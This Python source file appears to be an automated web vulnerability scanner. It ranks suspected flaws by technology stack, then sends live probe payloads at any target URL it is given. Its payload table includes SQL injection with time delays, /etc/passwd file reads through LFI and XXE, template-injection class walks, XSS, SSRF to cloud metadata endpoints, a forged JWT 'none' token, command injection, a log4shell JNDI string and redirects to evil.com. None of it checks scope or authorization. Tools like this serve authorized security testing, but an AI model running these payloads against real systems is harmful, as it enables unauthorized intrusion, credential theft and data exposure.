#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════╗
║   🔬 NOVA HYPOTHESIS ENGINE v1.0                                    ║
║                                                                      ║
║   Daybreak-class systematic hypothesis testing.                     ║
║   Forms ranked hypotheses, tests them with targeted probes,        ║
║   updates confidence via Bayesian inference, chains findings.       ║
╚══════════════════════════════════════════════════════════════════════╝
"""

import hashlib, json, os, re, time
from datetime import datetime
from typing import Dict, List, Tuple
from urllib.parse import urlparse, parse_qs

WORKSPACE = os.path.expanduser("~/nova_workspace")
NOVA_BIN  = os.path.join(WORKSPACE, "bin")


class Hypothesis:
    def __init__(self, vuln_type: str, description: str, target: str,
                 parameters: List[str] = None, prior: float = 0.4,
                 severity: str = "medium", evidence: List[str] = None):
        self.id          = hashlib.md5(f"{vuln_type}{target}{description}".encode()).hexdigest()[:8]
        self.vuln_type   = vuln_type
        self.description = description
        self.target      = target
        self.parameters  = parameters or []
        self.confidence  = prior
        self.severity    = severity
        self.evidence_for    = evidence or []
        self.evidence_against = []
        self.probe_results   = []
        self.confirmed   = False
        self.ruled_out   = False

    @property
    def priority(self) -> float:
        w = {"critical":4.0,"high":3.0,"medium":2.0,"low":1.0,"info":0.5}
        return self.confidence * w.get(self.severity, 1.0)

    def update(self, supports: bool, evidence: str, weight: float = 0.2):
        if supports:
            self.confidence = min(0.99, self.confidence + weight * (1 - self.confidence))
            self.evidence_for.append(evidence[:200])
        else:
            self.confidence = max(0.01, self.confidence - weight * self.confidence)
            self.evidence_against.append(evidence[:200])
        self.confirmed  = self.confidence >= 0.85
        self.ruled_out  = self.confidence <= 0.10
        self.probe_results.append({"supports": supports, "evidence": evidence[:200],
                                    "confidence": round(self.confidence,3)})

    def to_finding(self) -> Dict:
        return {"id": self.id, "name": self.vuln_type, "type": self.vuln_type,
                "description": self.description, "url": self.target,
                "severity": self.severity, "confidence": round(self.confidence,2),
                "confirmed": self.confirmed, "evidence": "\n".join(self.evidence_for[:3]),
                "tool": "nova_hypothesis_engine"}

    def __repr__(self):
        icon = "✅" if self.confirmed else ("❌" if self.ruled_out else "🔬")
        bar  = "█" * int(self.confidence*10) + "░"*(10-int(self.confidence*10))
        return f"{icon}[{self.id}][{bar}|{self.confidence:.2f}] {self.vuln_type}: {self.description[:55]}"


class HypothesisEngine:
    TECH_PRIORS = {
        "php":         {"sqli":0.55,"lfi":0.50,"rfi":0.30,"xxe":0.35,"type_juggling":0.45},
        "python":      {"ssti":0.45,"command_injection":0.35,"deserialization":0.30,"path_traversal":0.40},
        "java":        {"deserialization":0.60,"xxe":0.55,"sqli":0.45,"ssrf":0.40,"log4shell":0.35},
        "node":        {"prototype_pollution":0.65,"nosqli":0.55,"command_injection":0.40,"ssrf":0.45},
        "ruby":        {"mass_assignment":0.50,"ssti":0.40,"command_injection":0.35,"sqli":0.45},
        "wordpress":   {"sqli":0.65,"xss":0.60,"lfi":0.55,"file_upload":0.50},
        "graphql":     {"introspection_enabled":0.75,"batch_attack":0.55,"nosqli":0.50},
        "jwt":         {"algorithm_confusion":0.55,"none_algorithm":0.40,"jwks_injection":0.45},
        "spring":      {"actuator_exposure":0.55,"ssrf":0.50,"deserialization":0.45},
        "nginx":       {"alias_traversal":0.45,"http_smuggling":0.40},
        "solidity":    {"reentrancy":0.55,"integer_overflow":0.65,"access_control":0.60},
        "unknown":     {"sqli":0.25,"xss":0.30,"ssrf":0.20,"idor":0.35,"open_redirect":0.30},
    }

    PROBES = {
        "sqli": [
            {"payload":"'",                              "signal":["sql","syntax","error","ORA-"]},
            {"payload":"' OR '1'='1",                   "signal":["admin","user","email"]},
            {"payload":"' AND SLEEP(5)--",              "signal":["time_delay_5s"]},
            {"payload":"'; WAITFOR DELAY '0:0:5'--",    "signal":["time_delay_5s"]},
        ],
        "lfi": [
            {"payload":"../../../../etc/passwd",        "signal":["root:","daemon:","bin:"]},
            {"payload":"....//....//etc/passwd",        "signal":["root:","daemon:"]},
            {"payload":"php://filter/convert.base64-encode/resource=index.php","signal":["PD9waHA"]},
        ],
        "ssti": [
            {"payload":"{{7*7}}",                       "signal":["49"]},
            {"payload":"${7*7}",                        "signal":["49"]},
            {"payload":"{{config}}",                    "signal":["SECRET","DEBUG","DATABASE"]},
            {"payload":"{{''.__class__.__mro__[1].__subclasses__()}}","signal":["class "]},
        ],
        "xss": [
            {"payload":"<script>alert(1)</script>",     "signal":["<script>alert(1)"]},
            {"payload":"'\"><img src=x onerror=alert(1)>","signal":["onerror=alert"]},
            {"payload":"<svg/onload=alert(1)>",         "signal":["onload=alert"]},
        ],
        "ssrf": [
            {"payload":"http://169.254.169.254/latest/meta-data/","signal":["ami-id","instance-id"]},
            {"payload":"http://metadata.google.internal/computeMetadata/v1/","signal":["email","token"]},
            {"payload":"http://localhost:80/",          "signal":["localhost","loopback","127"]},
        ],
        "xxe": [
            {"payload":'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
             "signal":["root:","daemon:","bin:"]},
        ],
        "prototype_pollution": [
            {"payload":"__proto__[test]=nova123",       "signal":["nova123"]},
            {"payload":"constructor[prototype][test]=nova123","signal":["nova123"]},
        ],
        "open_redirect": [
            {"payload":"https://evil.com",              "signal":["evil.com","302","location:"]},
            {"payload":"//evil.com",                    "signal":["evil.com","302"]},
        ],
        "nosqli": [
            {"payload":'{"$gt":""}',                    "signal":["user","admin","email","200_returns_data"]},
            {"payload":'{"$ne":null}',                  "signal":["user","admin","200_returns_data"]},
        ],
        "algorithm_confusion": [
            {"payload":"eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.","signal":["admin","200_authenticated"]},
        ],
        "introspection_enabled": [
            {"payload":'{"query":"{__schema{types{name}}}"}','signal':["__Schema","QueryType","types"]},
        ],
        "command_injection": [
            {"payload":"; sleep 5 #",                   "signal":["time_delay_5s"]},
            {"payload":"| sleep 5",                     "signal":["time_delay_5s"]},
        ],
        "deserialization": [
            {"payload":"rO0AB",                         "signal":["exception","error","500"]},
        ],
        "log4shell": [
            {"payload":"${jndi:ldap://169.254.169.254/a}","signal":["error","500","exception"]},
        ],
    }

    def __init__(self, target: str, verbose: bool = True):
        self.target      = target
        self.verbose     = verbose
        self.hypotheses: List[Hypothesis] = []
        self.confirmed:  List[Hypothesis] = []

    def _http(self, url: str, timeout: int = 10) -> Tuple[int, str, Dict]:
        try:
            import urllib.request as ur
            req = ur.Request(url, headers={"User-Agent":"Mozilla/5.0 Nova/1.0"})
            with ur.urlopen(req, timeout=timeout) as r:
                return r.status, r.read(20000).decode("utf-8","replace"), dict(r.headers)
        except Exception as e:
            return 0, str(e)[:200], {}

    def generate_from_tech(self, techs: List[str], endpoints: List[str]) -> List[Hypothesis]:
        generated = []
        for tech in techs:
            priors = self.TECH_PRIORS.get(tech.lower(), self.TECH_PRIORS["unknown"])
            for vuln_type, prior_p in priors.items():
                if prior_p < 0.25: continue
                for endpoint in endpoints[:5]:
                    sev = self._severity(vuln_type)
                    h = Hypothesis(vuln_type, f"{tech} → {vuln_type} on {endpoint[:50]}",
                                   endpoint, self._params(endpoint), prior_p, sev, [f"tech:{tech}"])
                    generated.append(h)
        self.hypotheses.extend(generated)
        if self.verbose:
            print(f"  🔬 Generated {len(generated)} hypotheses from {techs}")
        return generated

    def test_hypothesis(self, h: Hypothesis) -> bool:
        if self.verbose: print(f"\n  🔬 Testing: {h}")
        probes = self.PROBES.get(h.vuln_type, [])
        if not probes: return False

        for param in (h.parameters or ["q","search","id","url","redirect","file","path"]):
            _, normal_body, _ = self._http(h.target, timeout=6)
            normal_len = len(normal_body)
            base = h.target.split("?")[0]
            qs   = dict(parse_qs(urlparse(h.target).query))

            for probe in probes[:3]:
                payload, signals = probe["payload"], probe["signal"]
                test_qs = dict(qs); test_qs[param] = [payload]
                test_url = base + "?" + "&".join(f"{k}={list(v)[0] if v else ''}" for k,v in test_qs.items())
                is_timing = any("time_delay" in s for s in signals)
                t0 = time.time()
                code, body, _ = self._http(test_url, timeout=12 if is_timing else 8)
                elapsed = time.time() - t0
                supported = False; evidence_str = ""
                for sig in signals:
                    if sig == "time_delay_5s":
                        if elapsed >= 4.5: supported = True; evidence_str = f"Delay:{elapsed:.1f}s"
                    elif sig == "200_returns_data":
                        if code == 200 and len(body) > normal_len: supported = True; evidence_str = "More data"
                    elif sig.lower() in body.lower():
                        idx = body.lower().find(sig.lower())
                        supported = True; evidence_str = body[max(0,idx-20):idx+len(sig)+40].strip()
                h.update(supported, f"param={param}, payload={payload[:35]}, {evidence_str}", weight=0.25)
                if self.verbose:
                    print(f"    {'✅' if supported else '⬜'} [{param}]={payload[:30]:<30} → {evidence_str[:40] or 'no match'}")
                if h.confirmed:
                    self.confirmed.append(h)
                    if self.verbose: print(f"    🎯 CONFIRMED: {h.vuln_type}")
                    return True
            if h.ruled_out: break
        return h.confirmed

    def _params(self, url: str) -> List[str]:
        try:
            qs = parse_qs(urlparse(url).query)
            return list(qs.keys())[:10] or ["q","search","id","url","file"]
        except: return ["q","search","id"]

    def _severity(self, vuln_type: str) -> str:
        crit = {"sqli","rce","command_injection","ssti","deserialization","xxe","ssrf","lfi",
                "algorithm_confusion","log4shell","reentrancy"}
        high = {"xss","open_redirect","idor","mass_assignment","nosqli","file_upload","cors",
                "prototype_pollution"}
        med  = {"csrf","info_disclosure","introspection_enabled","path_traversal","actuator_exposure"}
        if vuln_type in crit: return "critical"
        if vuln_type in high: return "high"
        if vuln_type in med:  return "medium"
        return "low"

    def run(self, techs: List[str] = None, endpoints: List[str] = None, max_hyp: int = 25) -> Dict:
        print(f"\n  🔬 Nova Hypothesis Engine — {self.target}\n")
        start = time.time()
        endpoints = endpoints or [self.target]
        techs     = techs or ["unknown"]
        self.generate_from_tech(techs, endpoints)
        self.hypotheses.sort(key=lambda h: -h.priority)
        to_test = [h for h in self.hypotheses if not h.ruled_out][:max_hyp]
        print(f"  🔬 Testing {len(to_test)} hypotheses by priority\n")
        for h in to_test:
            self.test_hypothesis(h)
        elapsed = round(time.time()-start,1)
        confirmed = [h for h in self.hypotheses if h.confirmed]
        print(f"\n  🔬 Complete: {len(confirmed)}/{len(to_test)} confirmed in {elapsed}s")
        return {"target":self.target,"duration":elapsed,"total":len(to_test),
                "confirmed":len(confirmed),"findings":[h.to_finding() for h in confirmed],
                "ruled_out":len([h for h in self.hypotheses if h.ruled_out])}


if __name__ == "__main__":
    import argparse, sys
    p = argparse.ArgumentParser(description="🔬 Nova Hypothesis Engine")
    p.add_argument("target"); p.add_argument("--techs",default="unknown"); p.add_argument("--verbose",action="store_true")
    args = p.parse_args()
    engine = HypothesisEngine(args.target, verbose=args.verbose)
    result = engine.run(techs=[t.strip() for t in args.techs.split(",")], endpoints=[args.target])
    print(json.dumps(result, indent=2))
